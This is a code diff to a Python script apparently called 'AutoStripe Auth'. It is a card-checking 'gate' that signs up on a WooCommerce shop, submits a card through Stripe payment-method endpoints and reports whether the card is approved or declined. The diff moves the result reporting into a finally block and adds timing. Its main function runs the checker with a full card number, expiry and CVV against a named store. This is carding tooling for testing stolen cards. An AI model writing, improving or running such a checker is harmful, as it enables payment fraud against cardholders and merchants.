@@ -144,8 +144,6 @@ async def jsone_consumer(prm, data):
 async def stripe_auth(card, url, session):
     status = None
     response = None
-    
-    output = {"status": False, 'response': 'Unknown Response', 'gate': 'AutoStripe Auth', 'card': card}
     start = time.time()
     
     try:
@@ -182,13 +180,11 @@ async def stripe_auth(card, url, session):
             else:
                 status = False
                 response = f'Failed to get Register Nonce'
-                output.update({"status": False, 'response': response, 'gate': 'AutoStripe Auth', 'card': card})
-                return output
+                return
         else:
             status = False
             response = f'Failed to get regi_nonce({request.status_code})'
-            output.update({"status": False, 'response': response, 'gate': 'AutoStripe Auth', 'card': card})
-            return output
+            return
 
         headers = {
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
@@ -225,8 +221,7 @@ async def stripe_auth(card, url, session):
         else:
             status = False
             response = f'Failed to add-payment-method({request.status_code})'
-            output.update({"status": False, 'response': response, 'gate': 'AutoStripe Auth', 'card': card})
-            return output
+            return
         
         
         if 'confirm' in prm:
@@ -262,8 +257,7 @@ async def stripe_auth(card, url, session):
             except:
                 status = False
                 response = f'Failed to get cs-si(Confirm)'
-                output.update({"status": False, 'response': response, 'gate': 'AutoStripe Auth', 'card': card})
-                return output
+                return
             
             headers = {
                 'accept': 'application/json',
@@ -289,19 +283,16 @@ async def stripe_auth(card, url, session):
                 if request.status_code == 200:
                     status = True
                     response = 'Approved:1000 ✅'
-                    output.update({"status": status, 'response': response, 'gate': 'AutoStripe Auth', 'card': card})
-                    return output
+                    return
                 else:
                     status = True
                     response = request.json()['error']['message']
-                    output.update({"status": status, 'response': response, 'gate': 'AutoStripe Auth', 'card': card})
-                    return output
+                    return
                     
             except:
                 status = False
                 response = 'Failed to get response (confirm)'
-                output.update({"status": status, 'response': response, 'gate': 'AutoStripe Auth', 'card': card})
-                return output
+                return
             
         if "wcpay_upe_config" in prm:
             headers = {
@@ -325,8 +316,7 @@ async def stripe_auth(card, url, session):
             except Exception:
                 status = False
                 response = f'Failed to get pm(wcpay_upe_config)'
-                output.update({"status": status, 'response': response, 'gate': 'AutoStripe Auth', 'card': card})
-                return output
+                return
                 
             headers = {
                 'accept': '*/*',
@@ -352,18 +342,15 @@ async def stripe_auth(card, url, session):
                 if 'error' in res:
                     status = True
                     response = res.get('error').get('message')
-                    output.update({"status": status, 'response': response, 'gate': 'AutoStripe Auth', 'card': card})
-                    return output
+                    return
                 elif 'succeeded' in res:
                     status = True
                     response = res.get('error').get('message')
-                    output.update({"status": status, 'response': response, 'gate': 'AutoStripe Auth', 'card': card})
-                    return output
+                    return
             except:
                 status = False
                 response = 'Error in getting response (wc_st_prm)'
-                output.update({"status": status, 'response': response, 'gate': 'AutoStripe Auth', 'card': card})
-                return output
+                return
             
         headers = {
             'accept': 'application/json',
@@ -386,8 +373,7 @@ async def stripe_auth(card, url, session):
         except Exception:
             status = False
             response = f'Failed to get pm(general)'
-                output.update({"status": status, 'response': response, 'gate': 'AutoStripe Auth', 'card': card})
-                return output
+            return
         
         if "wc_stripe_params" in prm:
             headers = {
@@ -417,18 +403,15 @@ async def stripe_auth(card, url, session):
             if 'error' in request.text:
                 status = True
                 response = request.json()['error']['message']
-                output.update({"status": status, 'response': response, 'gate': 'AutoStripe Auth', 'card': card})
-                return output
+                return
             elif 'success' in request.text:
                 status = True
                 response = 'Approved:1000 ✅'
-                output.update({"status": status, 'response': response, 'gate': 'AutoStripe Auth', 'card': card})
-                return output
+                return
             else:
                 status = False
                 response = 'Error in getting response (wc_st_prm)'
-                output.update({"status": status, 'response': response, 'gate': 'AutoStripe Auth', 'card': card})
-                return output
+                return
             
         if "wc_stripe_upe_params" in prm:
             headers = {
@@ -453,36 +436,32 @@ async def stripe_auth(card, url, session):
                 if 'error' in res:
                     status = True
                     response = res.get('error').get('message')
-                    output.update({"status": status, 'response': response, 'gate': 'AutoStripe Auth', 'card': card})
-                    return output
+                    return
                 elif 'succeeded' in res:
                     status = True
                     response = res.get('error').get('message')
-                    output.update({"status": status, 'response': response, 'gate': 'AutoStripe Auth', 'card': card})
-                    return output
+                    return
             except:
                 status = False
                 response = 'Error in getting response (wc_st_prm)'
-                output.update({"status": status, 'response': response, 'gate': 'AutoStripe Auth', 'card': card})
-                return output
+                return
             
     except Exception as e:
         status = False
         response = str(e)
         print(f"{e}")
         print(traceback.format_exc())
-        output.update({"status": status, 'response': response, 'gate': 'AutoStripe Auth', 'card': card})
-        return output
+        return
         
-    end = time.time()
-    took = end - start
-    output.update({"status": status, 'response': response, 'gate': 'AutoStripe Auth', 'card': card})
-    return output
+    finally:
+        end = time.time()
+        took = end - start
+        return {'status': status, 'response': response, 'took': f'{took:.2f}s', 'gate': 'AutoStripe Auth', 'card': f'{card}'}
 
 async def main():
     
     async with httpx.AsyncClient(timeout=90) as session:
-        await stripe_auth("4833120194926748|11|2029|913", "https://ethosconceptstore.com/my-account", session)
+        print(await stripe_auth("4833120194926748|11|2029|913", "https://ethosconceptstore.com/my-account", session))
 
 if __name__ == "__main__":
     asyncio.run(main())
